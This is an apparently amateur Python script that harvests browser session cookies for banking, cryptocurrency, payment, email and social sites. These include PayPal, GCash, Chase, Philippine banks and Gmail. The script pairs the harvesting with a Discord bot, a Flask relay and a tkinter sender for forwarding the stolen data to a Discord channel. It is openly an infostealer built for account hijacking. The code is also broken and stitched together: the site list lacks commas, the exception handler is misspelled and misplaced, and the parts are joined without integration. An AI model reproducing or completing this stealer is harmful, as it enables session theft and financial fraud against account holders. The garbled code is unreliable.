import browser_cookies3
# pagkulang dagdaganmo Kiel by JhonerTorres
sites = [
  "roblox.com"
  "discord.com"
  "gcash.com"
  "cash.app"
  "paypal.com"
  "venmo.com"
  "bitcoin.org"
  "ethereum.org"
  "tether.to"
  "circle.com/usdc"
  "binance.com"
  "xrpl,org"
  "solana.com"
  "bnbchain.org"
  "paxos.com"
  "chase.com"
  "jpmorganchase.com"
  "wellsfargo.com"
  "bdo.com.ph"
  "bpi.com.ph"
  "metrobank.com.ph"
  "landbank.com"
  "eastwestbanker.com"
  "unionbankph.com"
  "google.com"
  "mail.google.com"
  "gmail.com"
  "instagram.com"
]

cookies_by_site = {}

for site in sites:
  try:
    cookies_by_site[site] = {
      c.name: c.value
      for c in
      browser_cookies3.load(domain_name=site)
    }
    execept Exeption:
    cookies_by_site[site] = {}

for site, cookies in cookies_by_site.items():
  print(f"\nWebsite: {site}")
  for name, value in cookies.items():
    print(name, "=", value)
# send cookies3
import discord
from discord.ext import commands
from flask import Flask, request
import threading

TOKEN = "test"
CHANNEL_ID = 123456789012345678

intents = discord.Intents.default()
bot = commands.Bot(command_prefix="!", intents=intents)

app = Flask(__name__)

@app.route("/send", methods=["POST"])
def send():
    data = request.json
    msg = data.get("message")
    if msg:
        bot.loop.create_task(forward(msg))
    return "ok"

async def forward(msg):
    channel = bot.get_channel(CHANNEL_ID)
    if channel:
        await channel.send(msg)

def run_api():
    app.run(host="0.0.0.0", port=5000)

threading.Thread(target=run_api).start()
bot.run(TOKEN)

import tkinter as tk
import requests

API_URL = "test"

def send():
    msg = text.get("1.0", tk.END).strip()
    if msg:
        requests.post(API_URL, json={"message": msg})
        text.delete("1.0", tk.END)

root = tk.Tk()
root.title("UI Sender")
root.geometry("400x200")

text = tk.Text(root, height=6, width=45)
text.pack(pady=10)

tk.Button(root, text="Send to Discord", command=send).pack()

root.mainloop()
